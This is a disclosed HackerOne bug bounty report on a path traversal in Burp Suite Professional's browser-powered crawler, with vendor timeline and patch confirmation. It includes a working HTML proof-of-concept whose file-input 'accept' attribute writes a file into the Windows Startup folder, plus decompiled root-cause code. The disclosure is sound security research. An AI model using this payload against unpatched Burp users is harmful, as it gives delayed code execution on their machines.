---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2026-06-14
submitted: 2026-05-04T13:17:29.727Z
bounty_usd: 5000
votes: 177
cve: []
program: "[[programs/portswigger|PortSwigger Web Security]]"
reporter: "kawakatz"
source: "https://hackerone.com/reports/3712279"
title: "Burp Suite Professional: browser-powered crawl can write attacker-controlled files through file input handling"
---
# Burp Suite Professional: browser-powered crawl can write attacker-controlled files through file input handling

> **Severity:** High | **Bounty:** 5,000 USD | **Votes:** 177 | **Program:** PortSwigger Web Security | **Disclosed:** 2026-06-14

- Report: [https://hackerone.com/reports/3712279](https://hackerone.com/reports/3712279)
- CWE: Path Traversal
- Submitted: 2026-05-04T13:17:29.727Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Target

Burp Suite Professional 2026.3.3 on Windows.

## Summary

When Burp Scanner's browser-powered crawler crawls an attacker's website, the website can force Burp to write an attacker-controlled file to an attacker-controlled local path. For example, the PoC writes `calc.exe` into the current user's Startup folder, which triggers command execution when the user next logs in.

The issue is caused by Burp's handling of `<input type="file">`: Burp creates a local upload file from page-controlled attributes, but does not prevent path traversal in the generated filename.

## Steps To Reproduce

1. Serve the following HTML from an attacker-controlled website:

```html
<!doctype html>
<html>
  <body>
    <form action="/upload" method="post" enctype="multipart/form-data">
      <input
        type="file"
        name="upload"
        value="calc.exe"
        accept="./../../../../Roaming/Microsoft/Windows/Start Menu/Programs/Startup/burp_calc.bat">
      <button type="submit">Upload</button>
    </form>
  </body>
</html>
```

In my local reproduction, I served this file as:

```powershell
python -m http.server 8000
```

```text
http://192.168.186.149:8000/poc_file_input_write_startup_calc.html
```

2. In Burp Suite Professional, start a new crawl:

```text
Dashboard -> New scan -> Crawl
URLs to scan -> http://192.168.186.149:8000/poc_file_input_write_startup_calc.html

// to make it clear
Scan configuration -> Deep -> Crawl configuration -> Browser behaviour -> Always use Burps' browser
```

3. Start the crawl.

4. After the crawl processes the page, check the current user's Startup folder:

```text
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\burp_calc.bat
```

Observed result:

```text
calc.exe
```

5. Log out and log in again. `calc.exe` is executed from the Startup folder.

## Root Cause

The root cause is that Burp treats untrusted web page attributes as safe local file metadata.

The following snippets are from the decompiled Burp code, but I have renamed the obfuscated class, method, and variable names for readability. The logic is unchanged.

When the crawler interacts with a form, it detects file inputs and calls the file-input preparation code:

```java
for (FormInput input : discoveredInputs) {
    if (input.type() == InputType.FILE) {
        prepareFileInput(input);
        continue;
    }

    fillNormalInput(input);
}
```

The file-input preparation code creates a local file, writes the page-controlled input value into it, then selects that file in the browser:

```java
private static void prepareFileInput(FormInput input) throws IOException {
    if (isBlank(input.inputValue())) {
        return;
    }

    File uploadFile = buildTemporaryUploadFile(input);
    Files.write(uploadFile.toPath(), bytes(input.inputValue()));

    BrowserFileInput browserFileInput = input.browserElement().fileInput();
    browserFileInput.selectFile(uploadFile.toPath());
}
```

The local file path is built by creating a temporary directory and resolving the derived filename beneath it:

```java
private static File buildTemporaryUploadFile(FormInput input) throws IOException {
    String filename = input.deriveFileNameFromFileInput().orElse("file");
    Path tempDirectory = Files.createTempDirectory("burp");
    return tempDirectory.resolve(filename).toFile();
}
```

The unsafe filename comes from the file input's `accept` attribute. Burp accepts any token beginning with `.` as an extension:

```java
private Optional<FileName> deriveFileNameFromFileInput() {
    if (input.type() != InputType.FILE) {
        return Optional.empty();
    }

    String accept = input.attribute("accept");
    for (String token : accept.split(",")) {
        if (token.startsWith(".")) {
            fileNameBuilder.addExtension(token);
        }
    }

    return Optional.of(fileNameBuilder.build());
}
```

As a result, `Path.resolve(filename)` is used with attacker-controlled path traversal content.

## Recommended Fix

Burp should not use page-controlled file input metadata directly as a local filesystem path.

At minimum, the filename used for temporary upload files should be generated or sanitized so that a web page cannot introduce path separators, traversal sequences, or any value that escapes Burp's intended temporary directory.

## Impact

A website accessed through Burp Scanner can write attacker-controlled text files to arbitrary user-writable locations where the parent directory already exists.

On Windows, this can be used to write a `.bat` file to the current user's Startup folder. That file runs when the user next logs in, giving delayed code execution.

This matches the High severity example in the bounty guidelines:

```text
A website accessed through Burp Suite can make Burp execute arbitrary code
```

The guidelines also state:

```text
Websites accessed through Burp are untrusted, so anything a website could do to read files of the user's computer, read data out of Burp Suite, or gain remote code execution would be considered a vulnerability.
```

## Timeline

- **Report Filed**
- **2026-05-04** @kawakatz: ████████
████████
- **Report Needs More Info**
- **Report New**
- **Report Needs More Info**
- **Report New**
- **Report Triaged**
- **2026-05-07** @kawakatz: Thank you for the triage!
- **2026-05-07** @garethheyes: @kawakatz No worries, we realised this is a windows only issue that's why I couldn't reproduce it on mac.
- **2026-05-14** @albinowax: Hi @kawakatz, we've released 2026.4.3 with a patch for this vulnerability. Can you confirm it looks fixed from your side?
- **2026-05-14** @kawakatz: @albinowax Thank you for the fix.
The patch looks to be working on my end. The PoC no longer reproduces the issue.

████████
████████
- **Report Resolved**
- **Bounty Awarded**
- **Agreed On Going Public**
- **2026-05-15** @albinowax: Yes we're happy with disclosure. I'll wait for the 30 day timer to elapse to give our userbase time to patch.

You may want to review your attached videos or do limited disclosure to make sure you aren't leaking anything.
- **2026-05-15** @albinowax: Would you like to be credited in the release notes?
- **2026-05-15** @kawakatz: @albinowax Understood, thank you! Could you keep only fresh.mov visible and redact the other videos? And yes, I'd like to be credited in the release notes!
- **2026-05-15** @albinowax: Will do. How would you like to be credited?
- **2026-05-15** @kawakatz: @albinowax Please credit me as "Masahiro Kawada (@kawakatz)". Thank you!
- **Report Became Public**
